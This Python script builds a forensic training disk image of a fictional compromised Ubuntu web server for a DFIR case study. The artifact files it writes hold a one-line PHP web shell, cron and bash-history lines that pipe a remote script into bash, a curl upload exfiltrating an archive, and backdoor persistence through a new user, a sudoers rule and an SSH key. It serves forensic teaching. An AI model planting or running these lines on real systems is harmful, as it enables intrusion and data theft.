#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Build the evidence disk image for the DFIR case study.

Creates a realistic compromised-web-server filesystem, then packages it into an
ext4 image with `mkfs.ext4 -d`. No mount/loopback privileges required.

Scenario (fictional): server AZ-SRV-01, Ubuntu web host, compromised through an
uploaded PHP web shell, followed by persistence, credential access and staging.
All timestamps are synthetic but internally consistent across the intrusion.
"""
import os, shutil, subprocess, sys, gzip, hashlib, time

ROOT = os.path.dirname(os.path.abspath(__file__))
TREE = os.path.join(ROOT, "fs_tree")
IMG = os.path.join(ROOT, "AZ-SRV-01.img")
SIZE_MB = 128

ART = {
    # path: (content, mtime "YYYY-MM-DD HH:MM:SS")
    "/var/www/html/index.php": ("""<?php
echo "<h1>AZ Trading Co. - Portal</h1>";
?>\n""", "2026-01-04 09:00:00"),

    "/var/www/html/uploads/.cache.php": ("""<?php
// "cache helper"
if(isset($_POST['c'])){ system($_POST['c']); }
?>\n""", "2026-02-11 02:14:37"),

    "/var/log/apache2/access.log": ("""203.0.113.45 - - [11/Feb/2026:02:13:58 +0000] "GET /uploads/ HTTP/1.1" 200 341 "-" "Mozilla/5.0"
203.0.113.45 - - [11/Feb/2026:02:14:41 +0000] "POST /uploads/.cache.php HTTP/1.1" 200 187 "-" "curl/8.5.0"
203.0.113.45 - - [11/Feb/2026:02:15:02 +0000] "POST /uploads/.cache.php HTTP/1.1" 200 44 "-" "curl/8.5.0"
203.0.113.45 - - [11/Feb/2026:02:16:19 +0000] "POST /uploads/.cache.php HTTP/1.1" 200 1204 "-" "curl/8.5.0"
203.0.113.45 - - [11/Feb/2026:02:41:55 +0000] "POST /uploads/.cache.php HTTP/1.1" 200 96 "-" "curl/8.5.0"
198.51.100.7 - - [11/Feb/2026:03:05:12 +0000] "GET /index.php HTTP/1.1" 200 213 "-" "Mozilla/5.0"
""", "2026-02-11 03:05:12"),

    "/var/log/auth.log": ("""Feb 11 02:22:11 AZ-SRV-01 sshd[2141]: Accepted publickey for deploy from 203.0.113.45 port 51122 ssh2
Feb 11 02:22:11 AZ-SRV-01 sshd[2141]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
Feb 11 02:31:44 AZ-SRV-01 sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash
Feb 11 02:33:02 AZ-SRV-01 useradd[2298]: new user: name=svc-update, UID=1002, GID=1002, home=/home/svc-update, shell=/bin/bash
""", "2026-02-11 02:33:02"),

    "/var/spool/cron/crontabs/www-data": ("""# m h dom mon dow command
*/7 * * * * curl -s http://203.0.113.45/b | bash >/dev/null 2>&1
""", "2026-02-11 02:36:20"),

    "/home/deploy/.bash_history": ("""ls -la /var/www/html/uploads
unzip -o /tmp/upd.zip -d /var/www/html/uploads
curl -s http://203.0.113.45/b | bash
id
sudo -l
sudo bash
useradd -m -s /bin/bash svc-update
echo 'svc-update:Summer2026!' | chpasswd
tar -czf /tmp/.staging/exfil.tar.gz /etc /home /var/www 2>/dev/null
curl -T /tmp/.staging/exfil.tar.gz http://203.0.113.45/u
rm -f /tmp/.staging/exfil.tar.gz
""", "2026-02-11 02:44:09"),

    "/home/deploy/.ssh/authorized_keys": ("""ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGq7ExampleAttackerKeyMaterialForLabOnly0000000000 attacker@kali
""", "2026-02-11 02:24:05"),

    "/etc/passwd": ("""root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
deploy:x:1000:1000:Deploy User:/home/deploy:/bin/bash
svc-update:x:1002:1002::/home/svc-update:/bin/bash
""", "2026-02-11 02:33:02"),

    "/etc/sudoers.d/deploy": ("""deploy ALL=(ALL) NOPASSWD:ALL
""", "2026-02-11 02:31:50"),

    "/root/.bash_history": ("""apt-get update
systemctl restart apache2
tail -f /var/log/apache2/access.log
""", "2026-02-10 18:02:41"),

    "/tmp/.staging/README.txt": ("""stage 1 complete
""", "2026-02-11 02:43:57"),

    "/opt/backup/notes.txt": ("""Nightly backups run at 02:00 UTC. Retention 14 days.
""", "2026-01-19 11:20:00"),
}

DIRS = ["/var/www/html/uploads", "/var/log/apache2", "/home/deploy/.ssh",
        "/var/spool/cron/crontabs", "/tmp/.staging", "/opt/backup",
        "/etc/sudoers.d", "/home/svc-update"]


def sh(cmd):
    r = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if r.returncode != 0:
        print("ERR:", cmd, r.stderr[:300])
    return r


def main():
    if os.path.isdir(TREE):
        shutil.rmtree(TREE)
    for d in DIRS:
        os.makedirs(TREE + d, exist_ok=True)
    for path, (content, mtime) in ART.items():
        fp = TREE + path
        os.makedirs(os.path.dirname(fp), exist_ok=True)
        with open(fp, "w") as f:
            f.write(content)
        os.utime(fp, (time.mktime(time.strptime(mtime, "%Y-%m-%d %H:%M:%S")),) * 2)

    # a small "staged archive" that is deleted in the scenario but recoverable
    payload = os.path.join(TREE, "tmp/.staging", "exfil.tar.gz")
    with gzip.open(payload, "wb") as g:
        g.write(b"AZ-CUSTOMER-DB-EXPORT\n" * 200)
    os.utime(payload, (time.mktime(time.strptime("2026-02-11 02:43:30", "%Y-%m-%d %H:%M:%S")),) * 2)

    if os.path.exists(IMG):
        os.remove(IMG)
    print(sh(f"dd if=/dev/zero of={IMG} bs=1M count={SIZE_MB} status=none").stderr)
    print(sh(f"mkfs.ext4 -q -d {TREE} -L AZ-SRV-01 {IMG}").stderr)

    h = hashlib.sha256(open(IMG, "rb").read()).hexdigest()
    m = hashlib.md5(open(IMG, "rb").read()).hexdigest()
    print("image:", IMG)
    print("size:", os.path.getsize(IMG))
    print("md5:", m)
    print("sha256:", h)
    with open(os.path.join(ROOT, "hashes.txt"), "w") as f:
        f.write(f"AZ-SRV-01.img\nmd5    {m}\nsha256 {h}\nsize   {os.path.getsize(IMG)} bytes\n")


if __name__ == "__main__":
    main()
